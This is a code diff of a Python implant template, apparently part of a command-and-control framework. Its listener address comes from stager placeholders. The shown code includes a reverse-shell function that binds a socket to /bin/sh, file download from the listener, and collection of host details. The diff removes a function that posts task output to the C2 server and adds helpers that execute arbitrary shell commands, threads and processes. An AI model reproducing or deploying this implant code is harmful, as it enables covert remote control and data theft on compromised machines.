@@ -50,13 +50,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 URL = "http://{{stager.listener.address}}:{{stager.listener.port}}/"
 {% endif %}
 
-def update_module_output(task_id: int, module_output: str):
-    data = {
-        "id": task_id,
-        "output": module_output,
-    }
-    r.post(f"{URL}/update/{name}", json=data, verify=False)
-
 def download_file(file_name: str, file_path: str):
     with open(file_path, "wb") as f:
         f.write(r.get(URL+"download/"+file_name, verify=False).content)
@@ -73,7 +66,26 @@ def reverse_shell(address: str, port: int):
     os.dup2(s.fileno(), 2)
     sp.call(["/bin/sh", "-i"])
 
+def thread_execution(func: callable, args: tuple):
+    t = threading.Thread(target=func, args=args)
+    t.start()
+    data["output"] = "Thread started"
+    data["success"] = True
 
+def process_execution(func: callable, args: tuple):
+    p = multiprocessing.Process(target=func, args=args)
+    p.start()
+    data["output"] = "Process started"
+    data["success"] = True
+
+def shell_execution(cmd: str):
+    sp.getoutput(cmd)
+    data["output"] = "Shell command executed"
+    data["success"] = True
+
+def get_output(cmd: str):
+    data["output"] = sp.getoutput(cmd)
+    data["success"] = True
 data = {
     "address": socket.gethostbyname(socket.gethostname()),
     "hostname": sp.getoutput("hostname"),
